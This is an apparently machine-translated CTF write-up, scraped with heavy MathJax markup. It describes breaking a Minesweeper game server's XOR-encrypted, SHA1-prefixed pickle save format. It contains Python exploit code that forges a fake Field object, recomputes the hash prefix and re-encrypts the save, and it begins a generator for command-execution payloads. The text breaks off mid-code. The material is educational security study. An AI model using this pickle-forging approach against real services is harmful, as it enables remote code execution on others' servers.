xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-65" x="889" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-79" x="1356" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMAIN-3D" x="2131" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMAIN-28" x="3187" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-50" x="3577" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-72" x="4328" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-65" x="4780" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-66" x="5246" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-69" x="5797" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-78" x="6142" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMAIN-7C" x="6715" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMAIN-7C" x="6993" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-53" x="7272" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-68" x="7917" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-61" x="8494" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMAIN-31" x="9023" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMAIN-28" x="9524" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-44" x="9913" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-75" x="10742" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-6D" x="11314" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-70" x="12193" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMAIN-28" x="12696" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-46" x="13086" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-69" x="13835" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-65" x="14181" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-6C" x="14647" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-64" x="14946" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMAIN-29" x="15469" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMAIN-29" x="15859" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMAIN-7C" x="16248" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMAIN-7C" x="16527" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-44" x="16805" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-75" x="17634" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-6D" x="18206" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-70" x="19085" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMAIN-28" x="19588" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-46" x="19978" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-69" x="20727" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-65" x="21073" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-6C" x="21539" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-64" x="21838" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMAIN-29" x="22361" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMAIN-29" x="22751" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-6F" x="23390" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-70" x="23876" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-6C" x="24379" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-75" x="24678" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-73" x="25250" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-53" x="25720" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-61" x="26365" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-76" x="26895" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMATHI-65" x="27380" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMAIN-2C" x="27847" y="0"></use></g></svg><span class="MJX_Assistive_MathML MJX_Assistive_MathML_Block" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mi>K</mi><mi>e</mi><mi>y</mi><mo>=</mo><mo stretchy="false">(</mo><mi>P</mi><mi>r</mi><mi>e</mi><mi>f</mi><mi>i</mi><mi>x</mi><mrow class="MJX-TeXAtom-ORD"><mo stretchy="false">|</mo></mrow><mrow class="MJX-TeXAtom-ORD"><mo stretchy="false">|</mo></mrow><mi>S</mi><mi>h</mi><mi>a</mi><mn>1</mn><mo stretchy="false">(</mo><mi>D</mi><mi>u</mi><mi>m</mi><mi>p</mi><mo stretchy="false">(</mo><mi>F</mi><mi>i</mi><mi>e</mi><mi>l</mi><mi>d</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mrow class="MJX-TeXAtom-ORD"><mo stretchy="false">|</mo></mrow><mrow class="MJX-TeXAtom-ORD"><mo stretchy="false">|</mo></mrow><mi>D</mi><mi>u</mi><mi>m</mi><mi>p</mi><mo stretchy="false">(</mo><mi>F</mi><mi>i</mi><mi>e</mi><mi>l</mi><mi>d</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mtext>&nbsp;</mtext><mi>o</mi><mi>p</mi><mi>l</mi><mi>u</mi><mi>s</mi><mi>S</mi><mi>a</mi><mi>v</mi><mi>e</mi><mo>,</mo></math></span></span></div><script type="math/tex;mode=display" id="MathJax-Element-2"> Key = (Prefix || Sha1 (Dump (Field)) || Dump (Field)) \ oplus Save, </script></p>  Where <math></math><span class="MathJax_Preview" style="color: inherit; display: none;"></span><span class="MathJax_SVG" id="MathJax-Element-3-Frame" tabindex="0" style="font-size: 100%; display: inline-block; position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mrow class=&quot;MJX-TeXAtom-ORD&quot;><mo stretchy=&quot;false&quot;>|</mo></mrow><mrow class=&quot;MJX-TeXAtom-ORD&quot;><mo stretchy=&quot;false&quot;>|</mo></mrow></math>" role="presentation"><svg xmlns:xlink="http://www.w3.org/1999/xlink" width="1.294ex" height="2.66ex" viewBox="0 -832 557 1145.2" role="img" focusable="false" style="vertical-align: -0.728ex;" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMAIN-7C" x="0" y="0"></use><use xlink:href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://habr.com/ru/post/351360/&amp;xid=25657,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhie5QA78G89grPtgxLa4T1JgItdeQ#MJMAIN-7C" x="278" y="0"></use></g></svg><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mrow class="MJX-TeXAtom-ORD"><mo stretchy="false">|</mo></mrow><mrow class="MJX-TeXAtom-ORD"><mo stretchy="false">|</mo></mrow></math></span></span><script type="math/tex" id="MathJax-Element-3"> || </script>  - concatenation operation. <br><br>  From this we have: <i>Save</i> (which the game allows to receive) and <i>Prefix</i> (" <i>4n71cH3aT</i> ").  It remains to deal with the <i>Field</i> .  In order for the trick to work, it is necessary that our (fake) instance of <i>Field</i> matches exactly the instance on the server, <i>because</i> in our case <i>pickle.dumps ()</i> serializes the dictionary containing the fields of the instance of <i>Field</i> with their values. <br><br>  Recall what the <i>Field</i> consists of: <br><pre> <code class="python hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Field</span></span></span><span class="hljs-class">:</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">__init__</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(self, w, h, mines)</span></span></span><span class="hljs-function">:</span></span> self.w = w self.h = h self.mines = set() <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> len(self.mines) &lt; mines: y = random.randint(<span class="hljs-number"><span class="hljs-number">0</span></span>, h - <span class="hljs-number"><span class="hljs-number">1</span></span>) x = random.randint(<span class="hljs-number"><span class="hljs-number">0</span></span>, w - <span class="hljs-number"><span class="hljs-number">1</span></span>) self.mines.add((y, x)) self.mines = sorted(self.mines) self.opened = [] self.flagged = []</code> </pre><br>  Width, height are known, lists with open and cleared cells are the easiest to leave empty at all (having remained at the very beginning of the game, without making a single move);  coordinates remain min.  The only solution is passing the game to form a list with such coordinates. <br><br>  I never liked Minesweeper, but to make it fair, you can watch my passage under the spoiler: <br><div class="spoiler">  <b class="spoiler_title">How I played Minesman</b> <div class="spoiler_text">  <u>Note:</u> when executing the <i>o</i> or <i>f</i> command, the column is first specified, then the line;  for example, the <i>o3.15</i> command opens a cell with coordinates (15, 3). <br><br><img src="https://habrastorage.org/getpro/habr/post_images/2d0/6b0/2f9/2d06b02f9cef0cbdf8990502f00e8cb1.jpg" alt="image"><br></div></div><br>  As a result, we obtained such an array of mines: <br><pre> <code class="python hljs">mines = [ (<span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">12</span></span>), (<span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">14</span></span>), (<span class="hljs-number"><span class="hljs-number">2</span></span>, <span class="hljs-number"><span class="hljs-number">10</span></span>), (<span class="hljs-number"><span class="hljs-number">2</span></span>, <span class="hljs-number"><span class="hljs-number">12</span></span>), (<span class="hljs-number"><span class="hljs-number">2</span></span>, <span class="hljs-number"><span class="hljs-number">14</span></span>), (<span class="hljs-number"><span class="hljs-number">3</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>), (<span class="hljs-number"><span class="hljs-number">4</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>), (<span class="hljs-number"><span class="hljs-number">4</span></span>, <span class="hljs-number"><span class="hljs-number">15</span></span>), (<span class="hljs-number"><span class="hljs-number">5</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>), (<span class="hljs-number"><span class="hljs-number">8</span></span>, <span class="hljs-number"><span class="hljs-number">12</span></span>), (<span class="hljs-number"><span class="hljs-number">8</span></span>, <span class="hljs-number"><span class="hljs-number">13</span></span>), (<span class="hljs-number"><span class="hljs-number">8</span></span>, <span class="hljs-number"><span class="hljs-number">14</span></span>), (<span class="hljs-number"><span class="hljs-number">10</span></span>, <span class="hljs-number"><span class="hljs-number">5</span></span>), (<span class="hljs-number"><span class="hljs-number">10</span></span>, <span class="hljs-number"><span class="hljs-number">9</span></span>), (<span class="hljs-number"><span class="hljs-number">11</span></span>, <span class="hljs-number"><span class="hljs-number">7</span></span>), (<span class="hljs-number"><span class="hljs-number">11</span></span>, <span class="hljs-number"><span class="hljs-number">11</span></span>), (<span class="hljs-number"><span class="hljs-number">13</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>), (<span class="hljs-number"><span class="hljs-number">13</span></span>, <span class="hljs-number"><span class="hljs-number">9</span></span>), (<span class="hljs-number"><span class="hljs-number">14</span></span>, <span class="hljs-number"><span class="hljs-number">3</span></span>), (<span class="hljs-number"><span class="hljs-number">14</span></span>, <span class="hljs-number"><span class="hljs-number">15</span></span>) ]</code> </pre><br>  Now, connect to Minesweeper again to get an ‚Äúempty‚Äù save: <br><img src="https://habrastorage.org/getpro/habr/post_images/07f/b59/35f/07fb5935f6ca559da712b2b3c3a03b52.jpg" alt="image"><br><br><h2>  <font color="#cc0000">We write an exploit</font> </h2><br>  First we need a fake field, in which we immediately implement the <i>dump ()</i> method for convenience: <br><pre> <code class="python hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">FieldFake</span></span></span><span class="hljs-class">:</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">__init__</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(self, w, h, mines)</span></span></span><span class="hljs-function">:</span></span> self.w = w self.h = h self.mines = sorted(set(mines)) self.opened = [] self.flagged = [] <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">dump</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(self)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> pickle.dumps(self.__dict__, protocol=<span class="hljs-number"><span class="hljs-number">1</span></span>)</code> </pre><br>  Let's write the function of getting salted hash connected to the message and the function of xor-encryption: <br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">gamehash</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(gamepickle)</span></span></span><span class="hljs-function">:</span></span> h = hashlib.sha1() h.update(gamepickle) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">'4n71cH3aT'</span></span> + h.digest() + gamepickle <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">crypt</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(plain, key)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">''</span></span>.join([chr(ord(p) ^ ord(key[i % len(key)])) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i, p <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> enumerate(plain) ])</code> </pre><br>  We write a functor for generating payloads.  The desired command that the server should execute will be sent to the input, we will get the ready shellcode suitable for embedding into malicious storage at the output: <br><pre> <code class="python hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span 